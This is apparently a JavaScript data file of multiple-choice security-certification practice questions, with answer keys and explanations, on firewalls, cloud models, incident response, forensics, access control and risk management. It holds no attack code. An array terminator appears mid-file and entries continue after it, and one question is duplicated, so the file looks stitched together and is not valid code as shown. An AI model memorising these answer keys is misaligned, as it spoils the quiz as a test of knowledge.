  { id: 'D5-Q048', domain: 5, question: 'Mandatory vacation can detect:', options: ['Physical security issues', 'Fraudulent activity requiring constant presence', 'Network problems', 'Hardware issues'], correct: 1, explanation: 'Mandatory vacation forces others to cover, potentially exposing fraud.' },
  { id: 'D5-Q049', domain: 5, question: 'Security governance provides:', options: ['Only technical controls', 'Framework for security decisions and accountability', 'No structure', 'Random decisions'], correct: 1, explanation: 'Governance provides the framework for security decisions, roles, and accountability.' },
  { id: 'D5-Q050', domain: 5, question: 'Vendor risk tiering determines:', options: ['Vendor pricing', 'Level of assessment based on risk', 'No assessment', 'Random selection'], correct: 1, explanation: 'Risk tiering matches assessment rigor to vendor risk level.' }
];

  // Domain 3 Questions (50)
  { id: 'D3-Q001', domain: 3, question: 'Which firewall type provides application awareness and deep packet inspection?', options: ['Packet filtering', 'Stateful inspection', 'Next-Generation Firewall (NGFW)', 'Circuit-level gateway'], correct: 2, explanation: 'NGFWs combine traditional firewall with IPS, application awareness, and deep packet inspection.' },
  { id: 'D3-Q002', domain: 3, question: 'A WAF protects against attacks at which layer?', options: ['Layer 2', 'Layer 3', 'Layer 4', 'Layer 7'], correct: 3, explanation: 'Web Application Firewalls operate at Layer 7 (application layer), protecting web applications from attacks like SQLi and XSS.' },
  { id: 'D3-Q003', domain: 3, question: 'IPS differs from IDS because IPS:', options: ['Only detects attacks', 'Blocks attacks inline', 'Is less accurate', 'Uses fewer resources'], correct: 1, explanation: 'IPS (Intrusion Prevention System) is inline and blocks attacks. IDS only detects and alerts.' },
  { id: 'D3-Q004', domain: 3, question: 'A forward proxy hides:', options: ['Server identity', 'Client identity', 'Both equally', 'Neither'], correct: 1, explanation: 'Forward proxy sits between clients and internet, hiding client identity. Reverse proxy hides server identity.' },
  { id: 'D3-Q005', domain: 3, question: 'TLS 1.3 is preferred over TLS 1.2 because:', options: ['It is older and more tested', 'It has improved security and performance', 'It uses weaker encryption', 'It is easier to configure'], correct: 1, explanation: 'TLS 1.3 removes deprecated algorithms, provides forward secrecy, and reduces handshake latency.' },
  { id: 'D3-Q006', domain: 3, question: '802.1X uses which authentication server?', options: ['LDAP', 'RADIUS', 'Kerberos', 'SAML'], correct: 1, explanation: '802.1X port-based NAC uses RADIUS for authentication. Components: Supplicant → Authenticator → RADIUS.' },
  { id: 'D3-Q007', domain: 3, question: 'ZTNA provides access to:', options: ['Entire network like VPN', 'Specific applications only', 'Physical locations', 'Hardware devices'], correct: 1, explanation: 'ZTNA (Zero Trust Network Access) provides application-specific access, not broad network access like traditional VPN.' },
  { id: 'D3-Q008', domain: 3, question: 'IPsec tunnel mode is typically used for:', options: ['Remote user VPN only', 'Site-to-site VPN', 'Email encryption', 'Web browsing'], correct: 1, explanation: 'IPsec tunnel mode encrypts entire packets and is typically used for site-to-site VPN connections.' },
  { id: 'D3-Q009', domain: 3, question: 'WEP should:', options: ['Be used for home networks', 'Never be used (broken)', 'Be combined with WPA', 'Be used for guest networks'], correct: 1, explanation: 'WEP is completely broken and can be cracked in minutes. Never use WEP.' },
  { id: 'D3-Q010', domain: 3, question: 'WPA3 SAE provides protection against:', options: ['Physical attacks', 'Offline dictionary attacks', 'DDoS attacks', 'SQL injection'], correct: 1, explanation: 'WPA3 SAE (Simultaneous Authentication of Equals) resists offline dictionary attacks even with weak passwords.' },
  { id: 'D3-Q011', domain: 3, question: 'Enterprise wireless authentication (WPA2/3-Enterprise) uses:', options: ['Pre-shared keys', '802.1X with RADIUS', 'Open authentication', 'MAC filtering only'], correct: 1, explanation: 'Enterprise mode uses 802.1X with RADIUS, providing individual user credentials rather than shared passwords.' },
  { id: 'D3-Q012', domain: 3, question: 'An evil twin attack creates:', options: ['A duplicate user account', 'A fake AP with legitimate SSID', 'A cloned hard drive', 'A duplicate database'], correct: 1, explanation: 'Evil twin creates a malicious access point with the same SSID as a legitimate network.' },
  { id: 'D3-Q013', domain: 3, question: 'Bluebugging allows an attacker to:', options: ['Send messages', 'Steal data', 'Take full control of device', 'Block Bluetooth signals'], correct: 2, explanation: 'Bluebugging gives attackers full control. Bluejacking sends messages. Bluesnarfing steals data.' },
  { id: 'D3-Q014', domain: 3, question: 'In IaaS, the customer is responsible for patching:', options: ['Physical servers', 'Hypervisor', 'Operating system', 'Network infrastructure'], correct: 2, explanation: 'In IaaS, customers manage OS and up. Provider manages physical infrastructure and virtualization.' },
  { id: 'D3-Q015', domain: 3, question: 'Which cloud model has the LEAST customer responsibility?', options: ['IaaS', 'PaaS', 'SaaS', 'All are equal'], correct: 2, explanation: 'SaaS has least customer responsibility - provider manages everything; customer only manages data and access.' },
  { id: 'D3-Q016', domain: 3, question: 'CASB provides:', options: ['Cloud infrastructure', 'Visibility and control over cloud services', 'Cloud storage', 'Cloud computing power'], correct: 1, explanation: 'CASB (Cloud Access Security Broker) provides visibility into cloud usage and enforces security policies.' },
  { id: 'D3-Q017', domain: 3, question: 'CSPM identifies:', options: ['Cloud performance issues', 'Cloud security misconfigurations', 'Cloud costs', 'Cloud users'], correct: 1, explanation: 'CSPM (Cloud Security Posture Management) identifies security misconfigurations in cloud environments.' },
  { id: 'D3-Q018', domain: 3, question: 'Container image scanning should occur:', options: ['Only in production', 'Before deployment to production', 'Only when issues arise', 'Annually'], correct: 1, explanation: 'Container images should be scanned before deployment to catch vulnerabilities before production.' },
  { id: 'D3-Q019', domain: 3, question: 'Type 1 hypervisor runs:', options: ['On top of an OS', 'Directly on hardware (bare metal)', 'In a container', 'In the cloud only'], correct: 1, explanation: 'Type 1 (bare metal) hypervisors run directly on hardware. Type 2 runs on top of an OS.' },
  { id: 'D3-Q020', domain: 3, question: 'VM escape is a threat where an attacker:', options: ['Deletes virtual machines', 'Breaks out of VM to access hypervisor', 'Moves VMs between hosts', 'Creates unauthorized VMs'], correct: 1, explanation: 'VM escape breaks out of a virtual machine to access the hypervisor or other VMs - a critical threat.' },
  { id: 'D3-Q021', domain: 3, question: 'Five nines (99.999%) availability allows annual downtime of approximately:', options: ['5 hours', '52 minutes', '5 minutes', '5 seconds'], correct: 2, explanation: '99.999% = 5.26 minutes downtime per year. 99.99% = 52.6 minutes. 99.9% = 8.76 hours.' },
  { id: 'D3-Q022', domain: 3, question: 'RAID 5 can survive the failure of:', options: ['No disks', 'One disk', 'Two disks', 'All disks'], correct: 1, explanation: 'RAID 5 uses parity and can survive one disk failure. RAID 6 can survive two disk failures.' },
  { id: 'D3-Q023', domain: 3, question: 'Incremental backup captures changes since:', options: ['Last full backup only', 'Last backup of any type', 'Last week', 'Last month'], correct: 1, explanation: 'Incremental captures changes since the last backup (any type). Differential captures since last FULL backup.' },
  { id: 'D3-Q024', domain: 3, question: 'The 3-2-1 backup rule specifies:', options: ['3 backups per day', '3 copies, 2 media types, 1 offsite', '3 sites, 2 clouds, 1 local', '3 admins, 2 approvals, 1 restore'], correct: 1, explanation: '3-2-1: 3 copies of data, 2 different media types, 1 copy offsite.' },
  { id: 'D3-Q025', domain: 3, question: 'A cold site provides:', options: ['Immediate failover', 'Equipment ready in hours', 'Empty facility (days to activate)', 'Cloud-based recovery'], correct: 2, explanation: 'Cold site is empty space requiring days to set up. Hot = immediate. Warm = hours.' },
  { id: 'D3-Q026', domain: 3, question: 'AES-GCM provides:', options: ['Encryption only', 'Integrity only', 'Encryption and integrity', 'Key exchange only'], correct: 2, explanation: 'AES-GCM provides authenticated encryption - both confidentiality and integrity protection.' },
  { id: 'D3-Q027', domain: 3, question: 'ECB mode should be avoided because it:', options: ['Is too slow', 'Reveals patterns in encrypted data', 'Uses too much memory', 'Requires special hardware'], correct: 1, explanation: 'ECB (Electronic Codebook) encrypts identical blocks identically, revealing patterns in data.' },
  { id: 'D3-Q028', domain: 3, question: 'DLP can be deployed at:', options: ['Network only', 'Endpoint only', 'Network, endpoint, and cloud', 'Cloud only'], correct: 2, explanation: 'DLP can be network-based, endpoint-based, or cloud-based (via CASB integration).' },
  { id: 'D3-Q029', domain: 3, question: 'Crypto erasure destroys data by:', options: ['Physical destruction', 'Overwriting with zeros', 'Destroying encryption keys', 'Degaussing'], correct: 2, explanation: 'Crypto erasure destroys the encryption keys, making encrypted data unrecoverable.' },
  { id: 'D3-Q030', domain: 3, question: 'Anonymization differs from pseudonymization because anonymization:', options: ['Is reversible', 'Is irreversible', 'Uses encryption', 'Requires a key'], correct: 1, explanation: 'Anonymization is irreversible - data cannot be re-identified. Pseudonymization is reversible with the key.' },
  { id: 'D3-Q031', domain: 3, question: 'Data at rest should be protected with:', options: ['TLS', 'AES encryption', 'Access controls only', 'Network segmentation'], correct: 1, explanation: 'Data at rest uses AES encryption (full disk, database encryption). TLS protects data in transit.' },
  { id: 'D3-Q032', domain: 3, question: 'Data in transit should be protected with:', options: ['Full disk encryption', 'TLS/SSL', 'File permissions', 'Database encryption'], correct: 1, explanation: 'Data in transit uses TLS/SSL or VPN encryption. Full disk encryption protects data at rest.' },
  { id: 'D3-Q033', domain: 3, question: 'Degaussing is effective for:', options: ['SSDs', 'Magnetic media only', 'All storage types', 'Optical media'], correct: 1, explanation: 'Degaussing only works on magnetic media (HDDs, tapes). SSDs require different destruction methods.' },
  { id: 'D3-Q034', domain: 3, question: 'Fail secure means:', options: ['Allow access on failure', 'Deny access on failure', 'Alert on failure', 'Log on failure'], correct: 1, explanation: 'Fail secure (fail closed) denies access when the system fails. Fail open allows access.' },
  { id: 'D3-Q035', domain: 3, question: 'Defense in depth is BEST described as:', options: ['Single strong perimeter', 'Multiple overlapping security layers', 'One control per threat', 'Perimeter-only security'], correct: 1, explanation: 'Defense in depth uses multiple overlapping layers so failure of one doesn\'t compromise security.' },
  { id: 'D3-Q036', domain: 3, question: 'Split-brain in clustering occurs when:', options: ['A server crashes', 'Nodes lose communication and both become active', 'Backups fail', 'Network is congested'], correct: 1, explanation: 'Split-brain happens when cluster nodes lose communication and both try to be primary, causing data inconsistency.' },
  { id: 'D3-Q037', domain: 3, question: 'Load balancing provides:', options: ['Data encryption', 'Traffic distribution across servers', 'Intrusion detection', 'Log aggregation'], correct: 1, explanation: 'Load balancers distribute traffic across multiple servers for performance and availability.' },
  { id: 'D3-Q038', domain: 3, question: 'SDN (Software-Defined Networking) separates:', options: ['Data and applications', 'Control plane and data plane', 'Users and administrators', 'Wired and wireless'], correct: 1, explanation: 'SDN separates the control plane (decisions) from the data plane (forwarding) for flexible network management.' },
  { id: 'D3-Q039', domain: 3, question: 'A DMZ typically contains:', options: ['Internal databases', 'Public-facing servers', 'Domain controllers', 'Backup systems'], correct: 1, explanation: 'DMZ contains public-facing servers (web, email) isolated between external and internal networks.' },
  { id: 'D3-Q040', domain: 3, question: 'Network segmentation limits:', options: ['Internet access', 'Lateral movement', 'User authentication', 'Data encryption'], correct: 1, explanation: 'Segmentation limits lateral movement by creating boundaries between network zones.' },
  { id: 'D3-Q041', domain: 3, question: 'SCADA systems require:', options: ['Regular patching', 'Network isolation', 'Cloud deployment', 'User training only'], correct: 1, explanation: 'SCADA/ICS often cannot be patched and require network isolation for protection.' },
  { id: 'D3-Q042', domain: 3, question: 'EDR provides:', options: ['Network filtering', 'Behavioral detection and response on endpoints', 'Email filtering', 'Web filtering'], correct: 1, explanation: 'EDR (Endpoint Detection and Response) provides behavioral detection, forensics, and automated response on endpoints.' },
  { id: 'D3-Q043', domain: 3, question: 'Serverless computing security focus is on:', options: ['OS patching', 'Physical security', 'Function-level permissions and code', 'Network segmentation'], correct: 2, explanation: 'Serverless shifts focus to function permissions and secure code since provider manages infrastructure.' },
  { id: 'D3-Q044', domain: 3, question: 'API gateways provide:', options: ['Physical access control', 'Rate limiting and authentication for APIs', 'File encryption', 'Backup services'], correct: 1, explanation: 'API gateways provide authentication, rate limiting, and security controls for API access.' },
  { id: 'D3-Q045', domain: 3, question: 'Immutable infrastructure means:', options: ['Systems are never changed', 'Systems are replaced rather than modified', 'Systems cannot be accessed', 'Systems are encrypted'], correct: 1, explanation: 'Immutable infrastructure replaces systems rather than patching them, reducing configuration drift.' },
  { id: 'D3-Q046', domain: 3, question: 'Infrastructure as Code (IaC) benefits include:', options: ['Lower costs only', 'Consistent, version-controlled configurations', 'Faster hardware', 'Physical security'], correct: 1, explanation: 'IaC enables consistent, repeatable, and version-controlled infrastructure deployments.' },
  { id: 'D3-Q047', domain: 3, question: 'Chaos engineering intentionally:', options: ['Destroys systems', 'Introduces failures to test resilience', 'Creates security vulnerabilities', 'Removes security controls'], correct: 1, explanation: 'Chaos engineering deliberately introduces failures to test system resilience and find weaknesses.' },
  { id: 'D3-Q048', domain: 3, question: 'Geographic diversity in DR helps protect against:', options: ['Software bugs', 'Regional disasters', 'Password attacks', 'Social engineering'], correct: 1, explanation: 'Geographic diversity protects against regional disasters affecting a single location.' },
  { id: 'D3-Q049', domain: 3, question: 'BCP differs from DR because BCP focuses on:', options: ['IT systems only', 'Overall business operations', 'Technical recovery', 'Data backup'], correct: 1, explanation: 'BCP (Business Continuity) focuses on overall business operations. DR specifically addresses IT recovery.' },
  { id: 'D3-Q050', domain: 3, question: 'Graceful degradation means:', options: ['System fails completely', 'System provides reduced functionality instead of failing', 'System improves over time', 'System requires restart'], correct: 1, explanation: 'Graceful degradation provides reduced functionality rather than complete failure during issues.' },

  // Domain 4 Questions (50)
  { id: 'D4-Q001', domain: 4, question: 'SIEM provides:', options: ['Endpoint protection', 'Log aggregation and correlation', 'Email filtering', 'Physical security'], correct: 1, explanation: 'SIEM aggregates logs from multiple sources and correlates events to detect security incidents.' },
  { id: 'D4-Q002', domain: 4, question: 'SOAR automates:', options: ['Hardware provisioning', 'Incident response workflows', 'User training', 'Backup processes'], correct: 1, explanation: 'SOAR (Security Orchestration, Automation, Response) automates incident response workflows.' },
  { id: 'D4-Q003', domain: 4, question: 'The FIRST priority during an active ransomware attack is:', options: ['Identify the attacker', 'Contain the spread', 'Notify law enforcement', 'Restore from backup'], correct: 1, explanation: 'Containment is first priority to stop spread. Other actions follow after limiting damage.' },
  { id: 'D4-Q004', domain: 4, question: 'The incident response phase after Detection is:', options: ['Preparation', 'Containment', 'Recovery', 'Lessons Learned'], correct: 1, explanation: 'NIST IR: Preparation → Detection/Analysis → Containment/Eradication/Recovery → Lessons Learned.' },
  { id: 'D4-Q005', domain: 4, question: 'Chain of custody is important for:', options: ['Performance optimization', 'Legal admissibility of evidence', 'Network speed', 'User convenience'], correct: 1, explanation: 'Chain of custody documents evidence handling and is critical for legal admissibility.' },
  { id: 'D4-Q006', domain: 4, question: 'According to order of volatility, what should be collected FIRST?', options: ['Hard drive image', 'RAM/memory dump', 'Log files', 'Configuration files'], correct: 1, explanation: 'RAM is most volatile (lost when powered off) and should be collected first.' },
  { id: 'D4-Q007', domain: 4, question: 'A write blocker is used to:', options: ['Prevent data encryption', 'Prevent modification of evidence', 'Block network traffic', 'Prevent malware execution'], correct: 1, explanation: 'Write blockers prevent modifications to original evidence during forensic acquisition.' },
  { id: 'D4-Q008', domain: 4, question: 'Bit-for-bit imaging captures:', options: ['Only active files', 'Complete disk including deleted data', 'Only system files', 'Only user files'], correct: 1, explanation: 'Bit-for-bit (forensic) imaging captures everything including deleted data and slack space.' },
  { id: 'D4-Q009', domain: 4, question: 'DAC (Discretionary Access Control) means:', options: ['Mandatory labels control access', 'Owner determines who gets access', 'Roles determine access', 'Attributes determine access'], correct: 1, explanation: 'DAC allows owners to decide who can access their resources. Flexible but inconsistent.' },
  { id: 'D4-Q010', domain: 4, question: 'MAC (Mandatory Access Control) uses:', options: ['Owner discretion', 'Labels/classifications', 'Job roles', 'Time of day'], correct: 1, explanation: 'MAC uses security labels (classifications) to control access. Common in government/military.' },
  { id: 'D4-Q011', domain: 4, question: 'RBAC assigns permissions based on:', options: ['User identity', 'Job roles', 'Data sensitivity', 'Time of day'], correct: 1, explanation: 'RBAC (Role-Based Access Control) assigns permissions based on job roles - enterprise standard.' },
  { id: 'D4-Q012', domain: 4, question: 'ABAC makes decisions based on:', options: ['Roles only', 'Labels only', 'Multiple attributes', 'Owner discretion'], correct: 2, explanation: 'ABAC (Attribute-Based) uses multiple attributes (user, resource, environment) for granular control.' },
  { id: 'D4-Q013', domain: 4, question: 'Just-in-time (JIT) access provides:', options: ['Permanent elevated access', 'Temporary elevated access when needed', 'No elevated access', 'Shared elevated access'], correct: 1, explanation: 'JIT provides temporary privilege elevation only when needed, reducing standing privileges.' },
  { id: 'D4-Q014', domain: 4, question: 'PAM manages:', options: ['Regular user accounts', 'Privileged/admin accounts', 'Guest accounts', 'Service accounts only'], correct: 1, explanation: 'PAM (Privileged Access Management) manages and monitors privileged/administrative accounts.' },
  { id: 'D4-Q015', domain: 4, question: 'Shared accounts should be:', options: ['Used for convenience', 'Avoided due to lack of accountability', 'Required for admins', 'Used for all service accounts'], correct: 1, explanation: 'Shared accounts eliminate accountability - impossible to know who performed an action.' },
  { id: 'D4-Q016', domain: 4, question: 'GDPR breach notification must occur within:', options: ['24 hours', '72 hours', '7 days', '30 days'], correct: 1, explanation: 'GDPR requires breach notification to supervisory authority within 72 hours.' },
  { id: 'D4-Q017', domain: 4, question: 'DSAR stands for:', options: ['Data Security Access Review', 'Data Subject Access Request', 'Digital Security Assessment Report', 'Data Storage Access Registry'], correct: 1, explanation: 'DSAR (Data Subject Access Request) is a right under privacy laws to access personal data.' },
  { id: 'D4-Q018', domain: 4, question: 'DLP is used to:', options: ['Prevent data exfiltration', 'Speed up data transfer', 'Compress data', 'Encrypt all data'], correct: 0, explanation: 'DLP (Data Loss Prevention) prevents unauthorized data exfiltration.' },
  { id: 'D4-Q019', domain: 4, question: 'Security playbooks provide:', options: ['Random responses', 'Documented response procedures', 'Automated attacks', 'Compliance reports'], correct: 1, explanation: 'Playbooks document step-by-step response procedures for consistent incident handling.' },
  { id: 'D4-Q020', domain: 4, question: 'MTTR measures:', options: ['Time between failures', 'Time to detect incidents', 'Time to recover/repair', 'Time to report'], correct: 2, explanation: 'MTTR (Mean Time To Repair/Recover) measures average recovery time.' },
  { id: 'D4-Q021', domain: 4, question: 'Windows security logs are viewed using:', options: ['Task Manager', 'Event Viewer', 'Device Manager', 'Control Panel'], correct: 1, explanation: 'Event Viewer displays Windows security, system, and application logs.' },
  { id: 'D4-Q022', domain: 4, question: 'Syslog is commonly used on:', options: ['Windows only', 'Linux/Unix systems', 'Mobile devices only', 'Printers only'], correct: 1, explanation: 'Syslog is the standard logging protocol for Linux/Unix systems and network devices.' },
  { id: 'D4-Q023', domain: 4, question: 'NetFlow provides:', options: ['Full packet capture', 'Network traffic metadata/flow data', 'Email logs', 'Authentication logs'], correct: 1, explanation: 'NetFlow captures network traffic metadata (source, destination, ports, bytes) without full packets.' },
  { id: 'D4-Q024', domain: 4, question: 'Threat hunting is:', options: ['Passive monitoring', 'Proactive search for hidden threats', 'Automated scanning', 'User training'], correct: 1, explanation: 'Threat hunting proactively searches for threats that evade automated detection.' },
  { id: 'D4-Q025', domain: 4, question: 'Baselining is used to:', options: ['Establish normal behavior for anomaly detection', 'Create security policies', 'Train users', 'Encrypt data'], correct: 0, explanation: 'Baselines establish normal patterns so deviations (anomalies) can be detected.' },
  { id: 'D4-Q026', domain: 4, question: 'Alert fatigue occurs when:', options: ['Alerts are too quiet', 'Too many alerts cause important ones to be missed', 'Alerts are well-tuned', 'Alerts are automated'], correct: 1, explanation: 'Alert fatigue from too many alerts causes analysts to miss or ignore important ones.' },
  { id: 'D4-Q027', domain: 4, question: 'Eradication in IR involves:', options: ['Containing the threat', 'Removing the threat from systems', 'Detecting the threat', 'Documenting the incident'], correct: 1, explanation: 'Eradication removes the threat (malware, backdoors, compromised accounts) from affected systems.' },
  { id: 'D4-Q028', domain: 4, question: 'Lessons learned should be conducted:', options: ['Before incidents occur', 'After incident recovery', 'Only for major incidents', 'Annually only'], correct: 1, explanation: 'Lessons learned/post-incident review occurs after recovery to improve future response.' },
  { id: 'D4-Q029', domain: 4, question: 'Legal hold requires:', options: ['Destroying evidence', 'Preserving evidence for litigation', 'Encrypting all data', 'Deleting logs'], correct: 1, explanation: 'Legal hold requires preserving all relevant evidence when litigation is anticipated.' },
  { id: 'D4-Q030', domain: 4, question: 'File carving in forensics:', options: ['Deletes files', 'Recovers files based on file signatures', 'Encrypts files', 'Moves files'], correct: 1, explanation: 'File carving recovers files from disk by identifying file headers/signatures, even without filesystem data.' },
  { id: 'D4-Q031', domain: 4, question: 'Timeline analysis in forensics:', options: ['Predicts future attacks', 'Reconstructs sequence of events', 'Measures response time', 'Schedules backups'], correct: 1, explanation: 'Timeline analysis reconstructs the sequence of events during an incident.' },
  { id: 'D4-Q032', domain: 4, question: 'Credential harvesting attacks target:', options: ['Encryption keys', 'Usernames and passwords', 'Network traffic', 'Log files'], correct: 1, explanation: 'Credential harvesting steals usernames and passwords for unauthorized access.' },
  { id: 'D4-Q033', domain: 4, question: 'Pass-the-hash attacks exploit:', options: ['Encrypted passwords', 'Password hashes without cracking', 'Weak passwords', 'Password policies'], correct: 1, explanation: 'Pass-the-hash uses captured password hashes directly without needing to crack them.' },
  { id: 'D4-Q034', domain: 4, question: 'Golden ticket attacks exploit:', options: ['Web applications', 'Kerberos TGT forgery', 'Email systems', 'Firewalls'], correct: 1, explanation: 'Golden ticket attacks forge Kerberos Ticket Granting Tickets for persistent domain access.' },
  { id: 'D4-Q035', domain: 4, question: 'Containment strategy selection depends on:', options: ['Time of day only', 'Threat type, impact, and business needs', 'Hardware age', 'User preferences'], correct: 1, explanation: 'Containment strategy considers threat type, business impact, and operational requirements.' },
  { id: 'D4-Q036', domain: 4, question: 'Network isolation is a form of:', options: ['Detection', 'Containment', 'Eradication', 'Recovery'], correct: 1, explanation: 'Network isolation contains threats by preventing spread to other systems.' },
  { id: 'D4-Q037', domain: 4, question: 'Vulnerability scans should be run:', options: ['Once at installation', 'Regularly/continuously', 'Only after incidents', 'Annually only'], correct: 1, explanation: 'Vulnerability scanning should be regular and continuous to identify new vulnerabilities.' },
  { id: 'D4-Q038', domain: 4, question: 'False positives in vulnerability scanning:', options: ['Are always bad', 'Indicate nonexistent vulnerabilities', 'Are more dangerous than false negatives', 'Should be ignored'], correct: 1, explanation: 'False positives report vulnerabilities that don\'t actually exist, wasting investigation time.' },
  { id: 'D4-Q039', domain: 4, question: 'Patch management should include:', options: ['Testing before production deployment', 'Immediate production deployment', 'Ignoring non-critical patches', 'Annual patching only'], correct: 0, explanation: 'Patches should be tested in non-production before deploying to production systems.' },
  { id: 'D4-Q040', domain: 4, question: 'Exception handling in security requires:', options: ['No documentation', 'Documented justification and compensating controls', 'Permanent exceptions', 'Verbal approval only'], correct: 1, explanation: 'Security exceptions require documented justification, compensating controls, and regular review.' },
  { id: 'D4-Q041', domain: 4, question: 'User provisioning should follow:', options: ['User requests only', 'Least privilege principle', 'Maximum access principle', 'No specific guidelines'], correct: 1, explanation: 'User provisioning should follow least privilege - minimum access needed for job function.' },
  { id: 'D4-Q042', domain: 4, question: 'User deprovisioning should occur:', options: ['Eventually', 'Immediately upon termination', 'After 30 days', 'When user requests'], correct: 1, explanation: 'Accounts should be disabled immediately when employment ends to prevent unauthorized access.' },
  { id: 'D4-Q043', domain: 4, question: 'Access reviews should be conducted:', options: ['Never', 'Regularly (quarterly/annually)', 'Only when problems occur', 'Once at hire'], correct: 1, explanation: 'Regular access reviews ensure users have appropriate access and remove unnecessary permissions.' },
  { id: 'D4-Q044', domain: 4, question: 'Service accounts should:', options: ['Use interactive login', 'Have minimal permissions and be monitored', 'Share passwords with users', 'Have admin rights'], correct: 1, explanation: 'Service accounts should have minimal permissions, no interactive login, and be monitored.' },
  { id: 'D4-Q045', domain: 4, question: 'API security should include:', options: ['No authentication', 'Rate limiting and authentication', 'Unlimited access', 'Public documentation only'], correct: 1, explanation: 'APIs need authentication, authorization, rate limiting, and input validation.' },
  { id: 'D4-Q046', domain: 4, question: 'Automation reduces MTTR by:', options: ['Slowing response', 'Speeding consistent response', 'Eliminating all alerts', 'Removing human oversight'], correct: 1, explanation: 'Automation speeds response time with consistent execution of defined procedures.' },
  { id: 'D4-Q047', domain: 4, question: 'Security orchestration connects:', options: ['Physical cables', 'Multiple security tools', 'Network segments', 'User accounts'], correct: 1, explanation: 'Orchestration connects and coordinates multiple security tools for integrated response.' },
  { id: 'D4-Q048', domain: 4, question: 'Runbooks differ from playbooks because runbooks are:', options: ['Less detailed', 'More detailed step-by-step procedures', 'Higher level', 'Optional'], correct: 1, explanation: 'Runbooks are detailed operational procedures; playbooks are higher-level response guidelines.' },
  { id: 'D4-Q049', domain: 4, question: 'Security metrics should be:', options: ['Complex and technical only', 'Actionable and tied to business objectives', 'Hidden from management', 'Static and unchanging'], correct: 1, explanation: 'Security metrics should be actionable, measurable, and aligned with business objectives.' },
  { id: 'D4-Q050', domain: 4, question: 'KPIs for security operations might include:', options: ['Only cost metrics', 'MTTR, detection rate, false positive rate', 'Employee satisfaction only', 'Revenue metrics only'], correct: 1, explanation: 'Security KPIs include MTTR, MTTD, detection rate, false positive rate, and patch compliance.' },

  // Domain 5 Questions (50)
  { id: 'D5-Q001', domain: 5, question: 'A policy differs from a procedure because a policy:', options: ['Provides step-by-step instructions', 'States high-level intent and requirements', 'Is optional', 'Is technical documentation'], correct: 1, explanation: 'Policy states what and why (high-level). Procedure states how (step-by-step instructions).' },
  { id: 'D5-Q002', domain: 5, question: 'Standards are:', options: ['Optional recommendations', 'Specific mandatory requirements', 'Step-by-step instructions', 'High-level statements'], correct: 1, explanation: 'Standards specify mandatory requirements that support policies. More specific than policies.' },
  { id: 'D5-Q003', domain: 5, question: 'Guidelines are:', options: ['Mandatory requirements', 'Optional recommendations', 'Legal requirements', 'Step-by-step procedures'], correct: 1, explanation: 'Guidelines are optional recommendations and best practices, not mandatory requirements.' },
  { id: 'D5-Q004', domain: 5, question: 'The security steering committee typically includes:', options: ['Only IT staff', 'Executive and business stakeholders', 'Only security team', 'External auditors only'], correct: 1, explanation: 'Steering committees include executives and business stakeholders for strategic security decisions.' },
  { id: 'D5-Q005', domain: 5, question: 'AUP stands for:', options: ['Automated User Provisioning', 'Acceptable Use Policy', 'Advanced User Protocol', 'Authorized User Permissions'], correct: 1, explanation: 'AUP (Acceptable Use Policy) defines acceptable use of organizational IT resources.' },
  { id: 'D5-Q006', domain: 5, question: 'Risk = ', options: ['Threat only', 'Vulnerability only', 'Threat × Vulnerability × Impact', 'Impact only'], correct: 2, explanation: 'Risk considers threat (who/what), vulnerability (weakness), and impact (consequence).' },
  { id: 'D5-Q007', domain: 5, question: 'Qualitative risk assessment uses:', options: ['Dollar amounts', 'High/Medium/Low ratings', 'Statistical analysis', 'Insurance values'], correct: 1, explanation: 'Qualitative assessment uses subjective ratings (High/Medium/Low) rather than dollar values.' },
  { id: 'D5-Q008', domain: 5, question: 'ALE (Annual Loss Expectancy) is calculated as:', options: ['AV × EF', 'SLE × ARO', 'Threat × Vulnerability', 'Cost × Time'], correct: 1, explanation: 'ALE = SLE × ARO (Single Loss Expectancy × Annual Rate of Occurrence).' },
  { id: 'D5-Q009', domain: 5, question: 'SLE (Single Loss Expectancy) is calculated as:', options: ['AV × EF', 'ALE × ARO', 'Risk × Time', 'Threat × Impact'], correct: 0, explanation: 'SLE = Asset Value × Exposure Factor (percentage of asset lost).' },
  { id: 'D5-Q010', domain: 5, question: 'Risk transfer involves:', options: ['Accepting the risk', 'Eliminating the risk source', 'Shifting risk to third party (insurance)', 'Reducing risk with controls'], correct: 2, explanation: 'Risk transfer shifts risk to another party, typically through insurance or contracts.' },
  { id: 'D5-Q011', domain: 5, question: 'Risk acceptance should:', options: ['Never be documented', 'Be documented with justification', 'Be used for all risks', 'Avoid management approval'], correct: 1, explanation: 'Risk acceptance requires documented justification and appropriate management approval.' },
  { id: 'D5-Q012', domain: 5, question: 'Residual risk is:', options: ['Risk before controls', 'Risk remaining after controls', 'Total organizational risk', 'Transferred risk'], correct: 1, explanation: 'Residual risk remains after security controls are implemented. It cannot be eliminated.' },
  { id: 'D5-Q013', domain: 5, question: 'Risk appetite defines:', options: ['Specific controls needed', 'Amount of risk organization will accept', 'Insurance requirements', 'Compliance requirements'], correct: 1, explanation: 'Risk appetite is the level of risk an organization is willing to accept to achieve objectives.' },
  { id: 'D5-Q014', domain: 5, question: 'Third-party risk management addresses risks from:', options: ['Internal employees', 'External vendors and partners', 'Natural disasters', 'Technical vulnerabilities'], correct: 1, explanation: 'TPRM manages risks from vendors, suppliers, and partners who have access to systems or data.' },
  { id: 'D5-Q015', domain: 5, question: 'SOC 2 Type II differs from Type I because Type II:', options: ['Is less rigorous', 'Evaluates controls over a period of time', 'Is point-in-time only', 'Focuses on financial controls'], correct: 1, explanation: 'Type II evaluates control operation over time (6-12 months). Type I is point-in-time.' },
  { id: 'D5-Q016', domain: 5, question: 'Right to audit clauses allow:', options: ['Vendors to audit customers', 'Customers to verify vendor security', 'Unlimited access to vendor systems', 'Waiving security requirements'], correct: 1, explanation: 'Right to audit allows customers to verify vendor security practices and compliance.' },
  { id: 'D5-Q017', domain: 5, question: 'Vendor risk tiering determines:', options: ['Vendor pricing', 'Level of security assessment required', 'Contract length', 'Payment terms'], correct: 1, explanation: 'Risk tiering matches assessment rigor to vendor risk level - critical vendors get full assessments.' },
  { id: 'D5-Q018', domain: 5, question: 'Supply chain attacks target:', options: ['Physical delivery routes', 'Trusted vendors to reach their customers', 'Supply and demand', 'Shipping containers'], correct: 1, explanation: 'Supply chain attacks compromise trusted vendors (like SolarWinds) to reach downstream victims.' },
  { id: 'D5-Q019', domain: 5, question: 'PCI DSS applies to organizations that:', options: ['Handle any data', 'Process payment card data', 'Have over 100 employees', 'Are publicly traded'], correct: 1, explanation: 'PCI DSS applies to organizations that store, process, or transmit payment card data.' },
